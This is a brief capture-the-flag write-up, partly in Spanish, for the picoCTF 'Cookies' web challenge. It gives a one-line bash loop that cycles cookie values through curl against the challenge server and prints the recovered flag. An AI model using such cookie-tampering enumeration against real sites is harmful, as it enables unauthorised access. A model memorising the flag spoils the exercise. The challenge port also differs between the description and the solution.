# Cookies

## Descripción

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:29649/](http://mercury.picoctf.net:29649/)

## Pistas

None

## Solución

```
└─$ for i in {1..20}; do curl -s http://mercury.picoctf.net:17781/check -H "Cookie: name=$i"; done | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bc6v2525}</code></p>
```

## Bandera

picoCTF{3v3ry1_l0v3s_c00k135_bc6v2525}

## Notas adicionales



## Referencias
- http://mercury.picoctf.net:29649/